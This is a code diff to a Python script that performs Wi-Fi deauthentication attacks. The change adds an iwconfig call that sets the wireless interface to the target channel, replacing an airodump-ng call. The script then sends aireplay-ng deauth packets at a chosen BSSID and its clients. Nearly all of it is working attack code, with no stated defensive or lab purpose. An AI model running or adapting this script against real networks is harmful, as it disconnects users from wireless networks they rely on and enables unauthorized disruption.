@@ -28,7 +28,10 @@ def scan_networks(interface):
 def deauth_attack(interface, bssid, channel, clients=None):
     """Perform deauth attack on the target BSSID."""
     print(f"[*] Targeting BSSID: {bssid} on channel {channel}")
-    execute_command(f"airodump-ng --bssid {bssid} --channel {channel} {interface}")
+
+    # Set the interface to the correct channel
+    print(f"[*] Setting interface {interface} to channel {channel}")
+    execute_command(f"iwconfig {interface} channel {channel}")
 
     time.sleep(2)
     print("[*] Sending deauth packets...")
@@ -37,6 +40,7 @@ def deauth_attack(interface, bssid, channel, clients=None):
             execute_command(f"aireplay-ng --deauth 10 -a {bssid} -c {client} {interface}")
     else:
         execute_command(f"aireplay-ng --deauth 10 -a {bssid} {interface}")
+
 
 def main():
     interface = input("Enter your wireless interface: ")
